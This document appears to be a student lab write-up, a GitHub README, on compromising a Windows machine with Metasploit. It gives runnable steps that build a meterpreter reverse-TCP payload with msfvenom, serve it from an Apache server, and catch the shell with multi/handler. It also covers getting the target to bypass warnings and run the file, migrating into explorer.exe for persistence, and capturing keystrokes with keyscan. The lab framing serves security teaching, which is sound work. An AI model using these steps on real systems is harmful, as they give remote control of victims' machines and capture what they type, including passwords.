# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![eh exp 61](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/6906bd7f-cd7c-4c9c-a2ae-7b1ca0adf07b)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![eh exp 62](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/e5b18628-aa35-4e4f-a5ec-9761d3973299)
copy the fun.exe into the apache /var/www/html folder
![eh exp 63](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/346be849-1fb1-4118-8c70-c2f93d36d283)
Start apache server sudo systemctl apache2 start
![eh exp 64](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/61094de1-8d3e-45c6-9df8-13cc8bf713ae)
Check the status of apache2
![eh exp 65](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/25c8dfbd-4198-4a61-b1ab-e3b07ba81b1f)
Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![eh exp 66](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/d5634df4-88dd-4bc0-af11-bd0ededf8d4e)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 
![eh exp 67](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/7df5eae7-4a0c-49fb-92bf-56736a6866e2)
Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![eh exp 68](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/b9174417-200f-4e06-b669-c3148899e7fb)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![eh exp 69](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/24172985-4d98-43f4-bec7-dbbb937b798b)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![eh exp 610](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/20f1fffe-3518-40b3-9a11-7d78882fbe6d)
keyscan_dump Shows the keystrokes captured so far 
![eh exp 611](https://github.com/swetha1510/Compromising-windows-using-Metasploit/assets/120623583/9a6f844d-ea15-4095-adb6-37167a05d549)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
